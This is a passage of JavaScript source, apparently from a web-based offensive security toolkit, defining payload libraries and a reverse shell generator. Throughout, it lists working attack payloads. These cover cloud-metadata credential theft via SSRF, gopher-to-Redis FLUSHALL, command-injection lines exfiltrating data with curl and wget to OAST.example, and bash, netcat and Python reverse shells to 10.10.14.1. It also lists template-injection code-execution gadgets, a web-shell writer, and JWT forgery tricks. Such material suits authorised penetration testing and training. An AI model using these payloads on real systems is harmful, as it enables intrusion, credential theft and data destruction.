        { p: '/static../etc/passwd', d: 'Misconfigured alias (no trailing /)' },
        { p: '/api/v1../../../etc/passwd', d: 'API path alias' },
      ]},
      { name: 'SSRF + LFI Chains', items: [
        { p: 'http://target/?url=file:///etc/passwd', d: 'SSRF → file://' },
        { p: 'http://target/?url=gopher://internal:6379/_INFO', d: 'Gopher → Redis' },
        { p: 'http://target/?url=dict://internal:11211/stats', d: 'Dict → memcached' },
      ]},
    ];
    return renderPayloadLibrary('Path Traversal & File Disclosure', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== GRAPHQL HELPER =====
TOOLS['graphql-helper'] = {
  title: 'GraphQL Helper',
  desc: 'Exploit GraphQL APIs with ready-made introspection, IDOR, DoS, and injection queries.',
  render() {
    const sections = [
      { name: 'Introspection', note: 'First check - if enabled, dump the schema', items: [
        { p: '{__schema{types{name}}}', d: 'Quick check' },
        { p: '{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}}}', d: 'Full schema (use with fragments)' },
        { p: '{__type(name:"User"){name fields{name type{name kind ofType{name}}}}}', d: 'Inspect type' },
        { p: 'query IntrospectionQuery {__schema {queryType {name} mutationType {name} types {name kind description fields(includeDeprecated:true){name description type{...TypeRef}}}}}', d: 'Full introspection' },
      ]},
      { name: 'Introspection Bypass', items: [
        { p: 'POST /graphql with Content-Type: application/x-www-form-urlencoded', d: 'CT bypass' },
        { p: '{__schema\\n{types{name}}}', d: 'Newline bypass' },
        { p: 'GET /graphql?query={__schema{types{name}}}', d: 'GET method' },
        { p: '/v1/graphql, /api/graphql, /graphiql, /altair, /playground', d: 'Common endpoints' },
      ]},
      { name: 'IDOR via GraphQL', note: 'Most common GraphQL bug class', items: [
        { p: '{user(id:"1234"){email phone privateData}}', d: 'Direct ID swap' },
        { p: '{node(id:"VXNlcjoxMjM0"){...on User{email}}}', d: 'Relay node global ID' },
        { p: '{viewer{friends(first:100){edges{node{email}}}}}', d: 'Edges traversal' },
        { p: 'mutation{deletePost(id:"victim_post_id"){success}}', d: 'Cross-user delete' },
        { p: '{search(query:""){...on Private{secret}}}', d: 'Empty query enum' },
      ]},
      { name: 'GraphQL CSRF', items: [
        { p: 'GET /graphql?query=mutation{deleteAccount}', d: 'GET mutation (Facebook $7.5k)' },
        { p: 'Content-Type: application/x-www-form-urlencoded', d: 'Form-encoded body' },
        { p: '<form action="/graphql" method="POST"><input name="query" value="mutation{...}"></form>', d: 'Form CSRF' },
      ]},
      { name: 'GraphQL DoS', note: 'CVE-2022-37734 - query batching/nesting attacks', items: [
        { p: '{user{friends{friends{friends{friends{name}}}}}}', d: 'Deep nesting' },
        { p: '[{query:"{a:user{id}}"}, {query:"{b:user{id}}"}, ...]', d: 'Query batching' },
        { p: 'query{user @signature @signature @signature ...}', d: 'Directive overloading (Google $6k)' },
        { p: 'fragment A on User{friends{...A}}', d: 'Cyclic fragment' },
        { p: '{a:user{id} a:user{id} ...}', d: 'Field aliasing duplication' },
      ]},
      { name: 'SQLi via GraphQL', items: [
        { p: '{user(id:"1\' OR 1=1--"){name}}', d: 'String arg' },
        { p: '{search(filter:{name:{eq:"x\' UNION SELECT NULL--"}}){results}}', d: 'Filter SQLi' },
        { p: '{user(id:"1\' AND SLEEP(5)--"){name}}', d: 'Time-based' },
      ]},
      { name: 'Authorization Bypass', items: [
        { p: 'mutation{updateUser(id:"victim",input:{email:"a@b.c"}){id}}', d: 'Cross-tenant mutation' },
        { p: 'query{adminPanel{users{email}}} (as low-priv user)', d: 'Role check missing' },
        { p: 'Send same query twice rapidly', d: 'Cache misconfig (response leak)' },
        { p: '{me{...on Admin{secret}}}', d: 'Type confusion' },
      ]},
      { name: 'Useful Queries', items: [
        { p: '{__type(name:"Query"){fields{name}}}', d: 'List all queries' },
        { p: '{__type(name:"Mutation"){fields{name args{name type{name}}}}}', d: 'List mutations' },
        { p: '{__schema{directives{name args{name}}}}', d: 'List directives' },
      ]},
    ];
    return renderPayloadLibrary('GraphQL Helper', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== SSRF PAYLOAD LIBRARY =====
TOOLS['ssrf-helper'] = {
  title: 'SSRF Helper',
  desc: 'Server-Side Request Forgery payloads for cloud metadata, internal hosts, and filter bypasses.',
  render() {
    const sections = [
      { name: 'Cloud Metadata Endpoints', note: 'The classic SSRF win - read instance creds from the metadata service', items: [
        { p: 'http://169.254.169.254/latest/meta-data/', d: 'AWS metadata root' },
        { p: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', d: 'AWS IAM creds (list roles)' },
        { p: 'http://169.254.169.254/latest/user-data/', d: 'AWS user-data (often has secrets)' },
        { p: 'http://169.254.169.254/latest/dynamic/instance-identity/document', d: 'AWS instance identity' },
        { p: 'http://169.254.169.254/latest/api/token', d: 'AWS IMDSv2 token endpoint (PUT)' },
        { p: 'http://metadata.google.internal/computeMetadata/v1/', d: 'GCP metadata (requires Metadata-Flavor: Google header)' },
        { p: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', d: 'GCP SA token' },
        { p: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', d: 'Azure IMDS (requires Metadata: true header)' },
        { p: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', d: 'Azure managed identity token' },
        { p: 'http://100.100.100.200/latest/meta-data/', d: 'Alibaba Cloud metadata' },
        { p: 'http://169.254.169.254/openstack/latest/meta_data.json', d: 'OpenStack metadata' },
        { p: 'http://169.254.169.254/metadata/v1/', d: 'DigitalOcean metadata' },
        { p: 'http://169.254.169.254/hetzner/v1/metadata', d: 'Hetzner metadata' },
        { p: 'http://rancher-metadata/latest', d: 'Rancher metadata' },
      ]},
      { name: 'Localhost / Internal Targets', note: 'Try every variant - WAFs miss creative encodings', items: [
        { p: 'http://127.0.0.1/', d: 'Loopback' },
        { p: 'http://localhost/', d: 'Loopback name' },
        { p: 'http://[::1]/', d: 'IPv6 loopback' },
        { p: 'http://[::ffff:127.0.0.1]/', d: 'IPv4-mapped IPv6' },
        { p: 'http://0.0.0.0/', d: 'Wildcard - hits localhost on Linux' },
        { p: 'http://0/', d: 'Short zero (resolves to 0.0.0.0)' },
        { p: 'http://127.1/', d: 'Octet shorthand' },
        { p: 'http://2130706433/', d: 'Decimal IP for 127.0.0.1' },
        { p: 'http://0x7f000001/', d: 'Hex IP for 127.0.0.1' },
        { p: 'http://017700000001/', d: 'Octal IP for 127.0.0.1' },
        { p: 'http://127.0.0.1.nip.io/', d: 'DNS wildcard service' },
        { p: 'http://localtest.me/', d: 'Always-127.0.0.1 hostname' },
        { p: 'http://spoofed.burpcollaborator.net/', d: 'DNS that resolves to internal' },
      ]},
      { name: 'Internal Service Probing', note: 'Common ports/services to hit once you have SSRF', items: [
        { p: 'http://127.0.0.1:6379/', d: 'Redis' },
        { p: 'http://127.0.0.1:11211/', d: 'Memcached' },
        { p: 'http://127.0.0.1:9200/', d: 'Elasticsearch' },
        { p: 'http://127.0.0.1:8500/v1/agent/self', d: 'Consul agent' },
        { p: 'http://127.0.0.1:2379/v2/keys/', d: 'etcd' },
        { p: 'http://127.0.0.1:5984/_all_dbs', d: 'CouchDB' },
        { p: 'http://127.0.0.1:8080/', d: 'Generic app port' },
        { p: 'http://127.0.0.1:9000/', d: 'PHP-FPM / SonarQube' },
        { p: 'http://127.0.0.1:15672/api/overview', d: 'RabbitMQ mgmt' },
        { p: 'http://127.0.0.1:5000/v2/_catalog', d: 'Docker registry' },
        { p: 'http://127.0.0.1:2375/containers/json', d: 'Docker daemon (unauthed) - RCE if exposed' },
        { p: 'http://127.0.0.1:10250/pods', d: 'Kubelet API' },
        { p: 'https://kubernetes.default.svc/api/v1/namespaces/', d: 'In-cluster k8s API' },
      ]},
      { name: 'Scheme Abuse', note: 'When http:// is filtered, try other schemes', items: [
        { p: 'file:///etc/passwd', d: 'Local file read' },
        { p: 'file:///c:/windows/win.ini', d: 'Windows file read' },
        { p: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a', d: 'Gopher → Redis flushall' },
        { p: 'gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0aMAIL%20FROM:...', d: 'Gopher → SMTP relay' },
        { p: 'dict://127.0.0.1:11211/stats', d: 'Dict → memcached' },
        { p: 'ldap://127.0.0.1:389/', d: 'LDAP probe' },
        { p: 'sftp://127.0.0.1/', d: 'SFTP probe' },
        { p: 'tftp://127.0.0.1/', d: 'TFTP probe' },
        { p: 'jar:http://attacker.com/x.zip!/', d: 'JAR scheme (Java)' },
        { p: 'netdoc:///etc/passwd', d: 'Java legacy file scheme' },
      ]},
      { name: 'URL Parser Confusion / Filter Bypass', note: 'Different parsers split URLs differently - exploit the gap', items: [
        { p: 'http://attacker.com#@127.0.0.1/', d: 'Fragment trick' },
        { p: 'http://attacker.com@127.0.0.1/', d: 'Userinfo trick (validator sees attacker.com)' },
        { p: 'http://127.0.0.1.attacker.com/', d: 'Subdomain prefix' },
        { p: 'http://attacker.com.127.0.0.1.nip.io/', d: 'nip.io abuse' },
        { p: 'http://127.0.0.1%23.attacker.com/', d: 'URL-encoded fragment' },
        { p: 'http://127.0.0.1%2f.attacker.com/', d: 'Encoded slash' },
        { p: 'http://127。0。0。1/', d: 'Unicode dots (CJK)' },
        { p: 'http://127．0．0．1/', d: 'Unicode fullwidth dots' },
        { p: 'http://①②⑦.⓪.⓪.①/', d: 'Enclosed alphanumerics' },
        { p: 'http://attacker.com\\@127.0.0.1/', d: 'Backslash trick' },
        { p: 'http://127.0.0.1./', d: 'Trailing dot' },
        { p: 'http://[0:0:0:0:0:ffff:127.0.0.1]/', d: 'Long IPv6 form' },
      ]},
      { name: 'Redirect-based SSRF', note: 'When the fetcher follows redirects, host an attacker page that 302s to internal', items: [
        { p: 'http://attacker.com/redirect.php?url=http://169.254.169.254/', d: 'Open redirect on attacker server' },
        { p: 'http://attacker.com/r → 302 Location: http://127.0.0.1/', d: 'Stage on your own server' },
        { p: 'https://httpbin.org/redirect-to?url=http://127.0.0.1/', d: 'Public redirect chain' },
      ]},
      { name: 'DNS Rebinding', note: 'TTL=0 hostname that flips between attacker IP (passes filter) and 127.0.0.1 (fetched)', items: [
        { p: 'rebind.network', d: 'Service for DNS rebinding' },
        { p: '1u.ms / lock.cmpxchg8b.com', d: 'Rebinder services' },
        { p: 'r7a8b9c.your-domain.com', d: 'Self-hosted dnsrebinder' },
      ]},
      { name: 'Blind SSRF Detection', note: 'No response in body? Use OOB callbacks', items: [
        { p: 'http://YOUR-SUBDOMAIN.oast.fun/', d: 'Interactsh (project discovery)' },
        { p: 'http://YOUR-SUBDOMAIN.burpcollaborator.net/', d: 'Burp Collaborator' },
        { p: 'http://YOUR-ID.requestbin.com/', d: 'RequestBin' },
        { p: 'https://webhook.site/YOUR-ID', d: 'webhook.site (browser-friendly)' },
        { p: 'http://canarytokens.org/', d: 'Canary tokens' },
      ]},
      { name: 'Real-world chains', items: [
        { p: 'SSRF → AWS metadata → role creds → S3 read → secrets', d: 'Capital One pattern' },
        { p: 'SSRF → Redis FLUSHALL + SET shell → CONFIG SET dir → SAVE → RCE', d: 'Redis-to-RCE via gopher' },
        { p: 'SSRF → Docker daemon (2375) → container start → RCE', d: 'Docker socket exposure' },
        { p: 'SSRF → Kubelet (10250) → pod exec → RCE', d: 'k8s lateral movement' },
        { p: 'PDF generator + HTML <iframe src=file://> → file disclosure', d: 'Headless Chrome PDF SSRF' },
        { p: 'WebP/SVG image fetcher → file:// or internal HTTP', d: 'Avatar uploader SSRF' },
      ]},
    ];
    return renderPayloadLibrary('SSRF Helper', sections, []);
  },
  init() { initPayloadLibrary(); }
};


// ===== REVERSE SHELL GENERATOR (data bundled from 0dayCTF/reverse-shell-generator) =====
const RSG_TYPES = [['ReverseShell', 'Reverse'], ['BindShell', 'Bind'], ['MSFVenom', 'MSFVenom'], ['HoaxShell', 'HoaxShell']];
TOOLS['revshell'] = {
  title: 'Reverse Shell Generator',
  desc: 'Generate reverse, bind, MSFVenom, and HoaxShell payloads with encoding and listeners.',
  render() {
    const D = window.rsgData || { shells: [], listenerCommands: [] };
    const shells = D.shells || [];
    return `
      <div class="tool">
        <div class="rsg-top">
          ${card('Connection', `<div class="rsg-conn-fields">${field('IP / Interface', `<input type="text" id="rsg-ip" value="10.10.14.1">`)}${field('Port', `<input type="text" id="rsg-port" value="9001">`)}</div>`, { cls: 'rsg-conn' })}
          ${card('Listener', `
            <div class="rsg-listener-row">
              ${field('Listener', `<select id="rsg-listener">${(D.listenerCommands || []).map((l, i) => `<option value="${i}">${escapeHtml(l[0])}</option>`).join('')}</select>`)}
              <div class="rsg-outwrap">
                ${resultHead('Command', ghostBtn('rsg-lcopy'))}
                <pre class="not-pre mono" id="rsg-lout"></pre>
              </div>
            </div>
          `)}
        </div>
        ${card('Payload', `
          <div class="rsg-cfg">
            ${field('Shell', `<select id="rsg-shell">${shells.map(s => `<option${s === 'bash' ? ' selected' : ''}>${s}</option>`).join('')}</select>`)}
            ${field('Encoding', `<select id="rsg-enc"><option value="none">None</option><option value="b64">Base64</option><option value="url">URL Encode</option><option value="url2">Double URL</option></select>`)}
            ${field('OS', `<select id="rsg-os"><option value="all">All</option><option value="linux">Linux</option><option value="windows">Windows</option><option value="mac">Mac</option></select>`)}
          </div>
          <div class="rsg-tabs" id="rsg-tabs">${RSG_TYPES.map((t, i) => `<button class="rsg-tab${i === 0 ? ' active' : ''}" data-type="${t[0]}">${t[1]}</button>`).join('')}</div>
          <input type="text" id="rsg-search" placeholder="Filter payloads..." autocomplete="off" style="margin:10px 0 16px">
          <div class="rsg-grid">
            <div class="rsg-list" id="rsg-list"></div>
            <div class="rsg-outwrap">
              <div class="result-header"><h4 id="rsg-name">—</h4>${ghostBtn('rsg-copy')}</div>
              <pre class="not-pre mono" id="rsg-out"></pre>
            </div>
          </div>
        `)}
      </div>`;
  },
  init() {
    const D = window.rsgData;
    if (!D) { $('#rsg-out').textContent = 'Reverse-shell data failed to load.'; return; }
    const fixUrl = s => encodeURIComponent(s).replace(/[!'()*]/g, c => '%' + c.charCodeAt(0).toString(16).toUpperCase());
    const b64 = s => { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return btoa(s); } };
    const subst = (cmd) => {
      const ip = $('#rsg-ip').value.trim() || 'IP';
      const port = $('#rsg-port').value.trim() || 'PORT';
      const shell = $('#rsg-shell').value;
      return cmd.replace(/\{ip\}/g, ip).replace(/\{port\}/g, port).replace(/\{shell\}/g, shell);
    };
    const encode = (cmd) => {
      const c = subst(cmd), mode = $('#rsg-enc').value;
      if (mode === 'b64') return b64(c);
      if (mode === 'url') return fixUrl(c);
      if (mode === 'url2') return fixUrl(fixUrl(c));
      return c;
    };
    let activeType = 'ReverseShell', selected = null;
    const listEl = $('#rsg-list');
    const matches = () => {
      const os = $('#rsg-os').value, q = $('#rsg-search').value.trim().toLowerCase();
      return D.reverseShellCommands.filter(it => it.meta.includes(activeType)
        && (os === 'all' || it.meta.includes(os))
        && (!q || it.name.toLowerCase().includes(q)));
    };
    const renderOut = () => {
      if (!selected) { $('#rsg-name').textContent = '—'; $('#rsg-out').textContent = ''; return; }
      $('#rsg-name').textContent = selected.name;
      $('#rsg-out').textContent = encode(selected.command);
    };
    const renderList = () => {
      const items = matches();
      if (items.length) selected = (selected && items.find(x => x.name === selected.name)) || items[0];
      else selected = null;
      listEl.innerHTML = items.length
        ? items.map((it, i) => `<button class="rsg-item${selected && it.name === selected.name ? ' active' : ''}" data-i="${i}">${escapeHtml(it.name)}</button>`).join('')
        : '<div class="rsg-empty">No payloads match.</div>';
      $$('.rsg-item', listEl).forEach((b, i) => b.addEventListener('click', () => {
        selected = items[i];
        $$('.rsg-item', listEl).forEach(x => x.classList.remove('active'));
        b.classList.add('active');
        renderOut();
      }));
      renderOut();
    };
    const renderListener = () => {
      const l = D.listenerCommands[+$('#rsg-listener').value];
      const ip = $('#rsg-ip').value.trim() || 'IP', port = $('#rsg-port').value.trim() || 'PORT';
      $('#rsg-lout').textContent = l[1].replace(/\{ip\}/g, ip).replace(/\{port\}/g, port);
    };
    $$('.rsg-tab').forEach(t => t.addEventListener('click', () => {
      activeType = t.dataset.type;
      $$('.rsg-tab').forEach(x => x.classList.toggle('active', x === t));
      selected = null;
      renderList();
    }));
    $('#rsg-ip').addEventListener('input', () => { renderOut(); renderListener(); });
    $('#rsg-port').addEventListener('input', () => { renderOut(); renderListener(); });
    $('#rsg-shell').addEventListener('change', renderOut);
    $('#rsg-enc').addEventListener('change', renderOut);
    $('#rsg-os').addEventListener('change', renderList);
    $('#rsg-search').addEventListener('input', renderList);
    $('#rsg-listener').addEventListener('change', renderListener);
    wireCopy('rsg-copy', () => $('#rsg-out').textContent);
    wireCopy('rsg-lcopy', () => $('#rsg-lout').textContent);
    renderList();
    renderListener();
  }
};

// ===== COMMAND INJECTION PAYLOAD LIBRARY =====
TOOLS['cmdi-payloads'] = {
  title: 'Command Injection Helper',
  desc: 'OS command injection payloads: separators, blind/time-based, OOB, and filter/WAF bypasses.',
  render() {
    const sections = [
      { name: 'Separators & Chaining', note: 'Inject after a parameter that reaches a shell', items: [
        { p: '; id', d: 'Semicolon (Unix) - run a second command' },
        { p: '| id', d: 'Pipe - feed into a new command' },
        { p: '|| id', d: 'Run only if the first command fails' },
        { p: '& id', d: 'Background / chain (Unix & Windows)' },
        { p: '&& id', d: 'Run only if the first command succeeds' },
        { p: '`id`', d: 'Backtick command substitution' },
        { p: '$(id)', d: 'Modern command substitution' },
        { p: '%0a id', d: 'URL-encoded newline injects a new line' },
        { p: '%0aid', d: 'Newline, no space' },
        { p: '{cat,/etc/passwd}', d: 'Brace expansion (no spaces needed)' },
        { p: 'a) ; id ; (', d: 'Break out of a subshell / parentheses' },
      ]},
      { name: 'Confirm (Unix)', note: 'Low-noise commands to prove execution', items: [
        { p: 'id', d: 'Current uid/gid (best single proof)' },
        { p: 'whoami', d: 'Current user' },
        { p: 'uname -a', d: 'Kernel / OS' },
        { p: 'hostname', d: 'Host name' },
        { p: 'cat /etc/passwd', d: 'User list' },
        { p: 'echo CMDI$((7*7))', d: 'Math marker (CMDI49) - safe canary' },
      ]},
      { name: 'Confirm (Windows)', items: [
        { p: 'whoami', d: 'Current user' },
        { p: 'ver', d: 'Windows version' },
        { p: 'systeminfo', d: 'Full host info' },
        { p: 'ipconfig /all', d: 'Network config' },
        { p: 'type C:\\Windows\\win.ini', d: 'Read a known file' },
        { p: 'set', d: 'Environment variables' },
      ]},
      { name: 'Blind: Time-based', note: 'No output? Make it sleep and watch the response time', items: [
        { p: '; sleep 5', d: 'Unix delay' },
        { p: '$(sleep 5)', d: 'Delay via substitution' },
        { p: '`sleep 5`', d: 'Delay via backticks' },
        { p: '| ping -c 5 127.0.0.1', d: 'Delay via ping (Unix)' },
        { p: '& ping -n 5 127.0.0.1', d: 'Delay via ping (Windows)' },
        { p: '& timeout /t 5', d: 'Windows timeout' },
        { p: '; ping -c 5 127.0.0.1 #', d: 'Comment out the rest of the line' },
      ]},
      { name: 'Blind: Out-of-Band (OAST)', note: 'True blind - exfil to a Collaborator/Interactsh host', items: [
        { p: '; curl http://OAST.example/$(whoami)', d: 'HTTP callback with output' },
        { p: '; nslookup `whoami`.OAST.example', d: 'DNS exfil (Unix)' },
        { p: '& nslookup OAST.example', d: 'DNS callback (Windows)' },
        { p: '& powershell -c "iwr http://OAST.example"', d: 'HTTP callback (Windows)' },
        { p: '; wget --post-data "x=$(id|base64)" http://OAST.example', d: 'POST exfil, base64-encoded' },
      ]},
      { name: 'Filter / WAF Bypass', note: 'Defeat space/keyword filters', items: [
        { p: 'cat${IFS}/etc/passwd', d: '${IFS} replaces spaces' },
        { p: 'cat$IFS$9/etc/passwd', d: '$IFS$9 space trick' },
        { p: '{cat,/etc/passwd}', d: 'Brace expansion (no space)' },
        { p: 'c"a"t /etc/passwd', d: 'Quotes break keyword matching' },
        { p: "c'a't /etc/passwd", d: 'Single quotes break keywords' },
        { p: 'c\\at /etc/passwd', d: 'Backslash breaks keywords' },
        { p: '/???/c?t /etc/passwd', d: 'Wildcards avoid literal binary names' },
        { p: 'who$@ami', d: '$@ is empty - splits the word' },
        { p: 'echo aWQ=|base64 -d|bash', d: 'Base64-encoded command (id)' },
        { p: 'a;b$u{cat,/etc/passwd}', d: 'Mixed obfuscation' },
      ]},
      { name: 'Argument / Parameter Injection', note: 'When input becomes a flag, not a command', items: [
        { p: '-oProxyCommand=id', d: 'ssh/scp ProxyCommand RCE' },
        { p: '--use-askpass=/tmp/x', d: 'Abuse a tool that runs a helper' },
        { p: '-o /var/www/html/sh.php', d: 'Write to an arbitrary path (curl -o)' },
        { p: '@/etc/passwd', d: 'curl/ffmpeg file read via @file' },
      ]},
      { name: 'Reverse Shell Triggers', note: 'Full generators are in the Reverse Shell tool', items: [
        { p: '; bash -i >& /dev/tcp/10.10.14.1/443 0>&1', d: 'Bash TCP reverse shell' },
        { p: '; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 443 >/tmp/f', d: 'Netcat mkfifo reverse shell' },
        { p: '; python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.1",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")\'', d: 'Python3 reverse shell' },
      ]},
    ];
    const tips = [
      { title: 'Always confirm', body: 'If you see no output, switch to a time-based payload (sleep 5) and watch the response time, or use an OOB/DNS callback for true blind injection.' },
      { title: 'Math canary', body: 'echo $((7*7)) printing 49 proves a shell evaluated it, with far less noise than reading sensitive files.' },
      { title: 'Spaces blocked?', body: 'Use ${IFS}, $IFS$9, brace expansion {cmd,arg}, or tabs instead of spaces.' },
    ];
    return renderPayloadLibrary('Command Injection Payloads', sections, tips);
  },
  init() { initPayloadLibrary(); }
};

// ===== SSTI (TEMPLATE INJECTION) PAYLOAD LIBRARY =====
TOOLS['ssti-payloads'] = {
  title: 'SSTI Helper',
  desc: 'Server-Side Template Injection payloads and RCE chains for Jinja2, Twig, Freemarker, ERB and more.',
  render() {
    const sections = [
      { name: 'Detection & Polyglots', note: 'Send these first to see which syntax evaluates', items: [
        { p: '{{7*7}}', d: 'Jinja2 / Twig / Nunjucks → 49' },
        { p: '${7*7}', d: 'Freemarker / Mako / JSP EL → 49' },
        { p: '<%= 7*7 %>', d: 'ERB / EJS → 49' },
        { p: '#{7*7}', d: 'Ruby / Pug / Thymeleaf → 49' },
        { p: '*{7*7}', d: 'Thymeleaf / Spring EL → 49' },
        { p: "{{7*'7'}}", d: 'Jinja2 → 7777777, Twig → 49 (tells them apart)' },
        { p: '${{<%[%\'"}}%\\', d: 'Polyglot that errors across most engines' },
        { p: '{{ . }}', d: 'Go templates - dumps the context' },
      ]},
      { name: 'Jinja2 / Flask (Python)', note: 'Most common; many gadgets reach os', items: [
        { p: '{{config}}', d: 'Dump Flask config (often has SECRET_KEY)' },
        { p: '{{config.items()}}', d: 'Config as key/value pairs' },
        { p: '{{self.__init__.__globals__}}', d: 'Reach globals' },
        { p: "{{cycler.__init__.__globals__.os.popen('id').read()}}", d: 'RCE via cycler (clean, modern)' },
        { p: "{{lipsum.__globals__.os.popen('id').read()}}", d: 'RCE via lipsum' },
        { p: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", d: 'RCE via request object' },
        { p: "{{''.__class__.__mro__[1].__subclasses__()}}", d: 'List subclasses to find a gadget' },
        { p: "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}", d: 'Arbitrary file read' },
      ]},
      { name: 'Twig (PHP)', items: [
        { p: '{{7*7}}', d: 'Confirm (→ 49)' },
        { p: '{{_self}}', d: 'Twig template object' },
        { p: "{{['id']|filter('system')}}", d: 'RCE via filter (Twig 1.x)' },
        { p: "{{['id']|map('system')|join}}", d: 'RCE via map' },
        { p: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", d: 'RCE via undefined filter callback' },
      ]},
      { name: 'Freemarker (Java)', items: [
        { p: '${7*7}', d: 'Confirm (→ 49)' },
        { p: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', d: 'RCE via Execute' },
        { p: '${"freemarker.template.utility.Execute"?new()("id")}', d: 'One-liner Execute' },
        { p: '${product.getClass().getProtectionDomain()}', d: 'Reach the class loader' },
      ]},
      { name: 'Velocity (Java)', items: [
        { p: '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($p=$rt.getRuntime().exec("id"))$p', d: 'RCE via Runtime' },
        { p: '#set($e="exp")$e.getClass().forName("java.lang.System").getProperty("user.dir")', d: 'Read a system property' },
      ]},
      { name: 'Smarty (PHP)', items: [
        { p: '{$smarty.version}', d: 'Confirm Smarty + version' },
        { p: "{php}system('id');{/php}", d: 'RCE (Smarty < 3.1)' },
        { p: "{system('id')}", d: 'RCE if PHP functions are allowed' },
        { p: "{Smarty_Internal_Write_File::writeFile('x.php','<?php system($_GET[0]);',self::clearConfig())}", d: 'Write a web shell' },
      ]},
      { name: 'ERB / Ruby', items: [
        { p: '<%= 7*7 %>', d: 'Confirm (→ 49)' },
        { p: "<%= system('id') %>", d: 'RCE via system' },
        { p: '<%= `id` %>', d: 'RCE via backticks' },
        { p: "<%= IO.popen('id').read %>", d: 'RCE, captures output' },
        { p: "<%= File.read('/etc/passwd') %>", d: 'File read' },
      ]},
      { name: 'Mako (Python)', items: [
        { p: '${7*7}', d: 'Confirm (→ 49)' },
        { p: "<%import os%>${os.popen('id').read()}", d: 'RCE via import' },
        { p: "${self.module.cache.util.os.system('id')}", d: 'RCE via module chain' },
      ]},
      { name: 'Node (EJS / Pug / Nunjucks)', items: [
        { p: "<%= global.process.mainModule.require('child_process').execSync('id') %>", d: 'EJS RCE' },
        { p: "#{global.process.mainModule.require('child_process').execSync('id')}", d: 'Pug RCE' },
        { p: '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}', d: 'Nunjucks RCE' },
      ]},
    ];
    const tips = [
      { title: 'Map before you fire', body: 'Use the detection payloads to identify the engine first - the wrong RCE gadget just errors and can lock you out of a parameter.' },
      { title: '7*7 vs 7*\'7\'', body: 'A multiplied number (49) means code execution. {{7*\'7\'}} returning 7777777 points to Jinja2, while 49 points to Twig.' },
      { title: 'Sandboxes', body: 'Many engines sandbox by default. Look for gadget chains (cycler, lipsum, request) that escape to os/Runtime.' },
    ];
    return renderPayloadLibrary('SSTI Payloads', sections, tips);
  },
  init() { initPayloadLibrary(); }
};

// ===== JWT ATTACK HELPER =====
TOOLS['jwt-attacks'] = {
  title: 'JWT Attack Helper',
  desc: 'JSON Web Token attack techniques: alg confusion, key confusion, kid/jku injection, weak secrets.',
  render() {
    const sections = [
      { name: 'alg=none', note: 'Strip the signature entirely if the server accepts it', items: [
        { p: '{"alg":"none","typ":"JWT"}', d: 'Set alg to none, then send an empty signature.' },
        { p: '{"alg":"None","typ":"JWT"}', d: 'Case variant to dodge a naive "none" blocklist.' },
        { p: '{"alg":"nOnE","typ":"JWT"}', d: 'Mixed case bypass.' },
        { p: 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.', d: 'alg=none token: header.payload. with a trailing dot and no signature.' },
      ]},
      { name: 'Key Confusion (RS256 to HS256)', note: 'Make the server verify an HMAC using the public key', items: [
        { p: '{"alg":"HS256"}', d: 'Switch the header from RS256 to HS256.' },
        { p: 'jwt_tool TOKEN -X k -pk public.pem', d: 'Sign with the RS256 public key as the HMAC secret.' },
        { p: 'openssl s_client -connect host:443 | openssl x509 -pubkey -noout', d: 'Recover the public key from TLS if not published.' },
      ]},
      { name: 'Weak HMAC Secret', note: 'Brute-force the signing key offline', items: [
        { p: 'hashcat -a 0 -m 16500 token.jwt wordlist.txt', d: 'Crack a weak HS256/384/512 secret (hashcat mode 16500).' },
        { p: 'jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt', d: 'Dictionary attack the secret with jwt_tool.' },
        { p: 'secret', d: 'Common secrets: secret, password, changeme, key, your-256-bit-secret, jwt_secret.' },
      ]},
      { name: 'kid Header Injection', note: 'kid often selects the key by path or DB lookup', items: [
        { p: '{"alg":"HS256","kid":"/dev/null"}', d: 'Point kid at an empty file, then HMAC-sign with an empty key.' },
        { p: '{"alg":"HS256","kid":"../../../../../../dev/null"}', d: 'Path traversal to a predictable/empty file.' },
        { p: '{"kid":"key\' UNION SELECT \'attacker-secret\'-- -"}', d: 'SQL injection in kid to return an attacker-known key.' },
        { p: '{"kid":"/etc/passwd"}', d: 'Use a known static file as the HMAC key.' },
        { p: '{"kid":"x|id"}', d: 'Command injection if kid is passed to a shell.' },
      ]},
      { name: 'jku / x5u / jwk Headers', note: 'Trick the server into fetching/trusting your key', items: [
        { p: '{"alg":"RS256","jku":"https://attacker.tld/jwks.json"}', d: 'Host your own JWKS and sign with the matching private key.' },
        { p: '{"alg":"RS256","jku":"https://trusted.tld@attacker.tld/jwks.json"}', d: 'jku host confusion to pass a domain allowlist.' },
        { p: '{"alg":"RS256","x5u":"https://attacker.tld/cert.pem"}', d: 'x5u points to an attacker certificate chain.' },
        { p: '{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}', d: 'Embed your own public key in the header (if blindly trusted).' },
      ]},
      { name: 'Claim Tampering', items: [
        { p: '{"sub":"admin","role":"admin","isAdmin":true}', d: 'Escalate by editing identity/role claims (needs a sig bypass).' },
        { p: 'Remove or extend "exp"', d: 'Drop exp or push it far into the future to keep a token alive.' },
        { p: '{"aud":"other-service"}', d: 'Swap aud to reuse a token across services.' },
      ]},
      { name: 'Tooling', items: [
